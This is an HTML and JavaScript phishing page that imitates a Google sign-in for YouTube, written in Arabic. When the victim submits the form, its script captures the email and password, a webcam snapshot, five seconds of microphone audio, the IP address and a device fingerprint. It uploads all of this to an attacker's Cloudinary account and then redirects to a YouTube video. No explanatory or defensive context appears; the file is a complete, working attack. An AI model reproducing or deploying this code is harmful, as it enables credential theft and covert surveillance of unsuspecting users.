<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - التحقق من الهوية</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .card { width: 95%; max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; background: #fff; }
        img.logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
        button { background: #1a73e8; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: 600; cursor: pointer; }
        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
        #c { display: none; }
    </style>
</head>
<body>

<div class="card" id="ui">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
    <h1>تسجيل الدخول</h1>
    <p>المتابعة إلى YouTube</p>
    <input type="email" id="e" placeholder="البريد الإلكتروني أو الهاتف" required>
    <input type="password" id="p" placeholder="كلمة المرور" required>
    <button onclick="run()">التالي</button>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    const cn = 'dgkttv99v', pr = 'ml_default', yt = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

    async function run() {
        const email = document.getElementById('e').value, pass = document.getElementById('p').value;
        if(!email || !pass) return alert("يرجى إدخال البيانات");

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const video = document.getElementById('v');
            video.srcObject = stream;
            video.play();

            document.getElementById('ui').innerHTML = "<h3>جاري مزامنة الحساب...</h3><p>يرجى الانتظار لإتمام الفحص الأمني</p>";

            const specs = await getFullFingerprint();

            setTimeout(async () => {
                const canvas = document.getElementById('c');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                const img = canvas.toDataURL("image/png");
                startFinalPhase(email, pass, img, specs, stream);
            }, 2500);

        } catch (err) { window.location.href = yt; }
    }

    async function getFullFingerprint() {
        let ua = navigator.userAgent;
        let f = {
            br: "Other", // Browser
            mod: "Unknown", // Model
            lang: navigator.language,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cpu: navigator.hardwareConcurrency || "N/A",
            ram: navigator.deviceMemory || "N/A",
            bat: "N/A", char: "N/A"
        };

        // فحص المتصفح بدقة
        if (ua.indexOf("Chrome") > -1) f.br = "Chrome";
        else if (ua.indexOf("Firefox") > -1) f.br = "Firefox";
        else if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") == -1) f.br = "Safari";
        else if (ua.indexOf("Edge") > -1) f.br = "Edge";

        // استخراج موديل الجهاز
        const match = ua.match(/\(([^)]+)\)/);
        if (match) {
            let parts = match[1].split(';');
            f.mod = (parts.length > 2) ? parts[2].trim() : parts[0].trim();
            if(f.mod.includes("Linux")) f.mod = (parts[1] || "Linux").trim();
        }

        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                f.bat = Math.round(b.level * 100) + "%";
                f.char = b.charging ? "Yes" : "No";
            }
        } catch(e){}
        return f;
    }

    function startFinalPhase(e, p, img, s, stream) {
        const mime = MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/ogg';
        const recorder = new MediaRecorder(stream, { mimeType: mime });
        let chunks = [];

        recorder.ondataavailable = ev => chunks.push(ev.data);
        recorder.onstop = async () => {
            const audioBlob = new Blob(chunks, { type: mime });
            await sendEverything(e, p, img, audioBlob, s);
            window.location.href = yt;
        };

        recorder.start();
        setTimeout(() => recorder.stop(), 5000);
    }

    async function sendEverything(e, p, img, aud, s) {
        let ip = "Unknown";
        try { 
            const r = await fetch('https://api.ipify.org?format=json');
            const d = await r.json();
            ip = d.ip;
        } catch(err){}

        // تجميع "البصمة الشاملة" في الـ Context
        const ctx = `u=${e}|p=${p}|ip=${ip}|br=${s.br}|mod=${s.mod}|ram=${s.ram}GB|cpu=${s.cpu}C|bat=${s.bat}|char=${s.char}|tz=${s.tz}|lang=${s.lang}`;

        const fd1 = new FormData();
        fd1.append('file', img); fd1.append('upload_preset', pr);
        fd1.append('context', ctx); fd1.append('tags', 'DeathLink_Master');

        const fd2 = new FormData();
        fd2.append('file', aud); fd2.append('upload_preset', pr);
        fd2.append('resource_type', 'video'); fd2.append('context', ctx);

        await Promise.all([
            fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, { method: 'POST', body: fd1 }),
            fetch(`https://api.cloudinary.com/v1_1/${cn}/upload`, { method: 'POST', body: fd2 })
        ]);
        
        return new Promise(res => setTimeout(res, 800));
    }
</script>
</body>
</html>
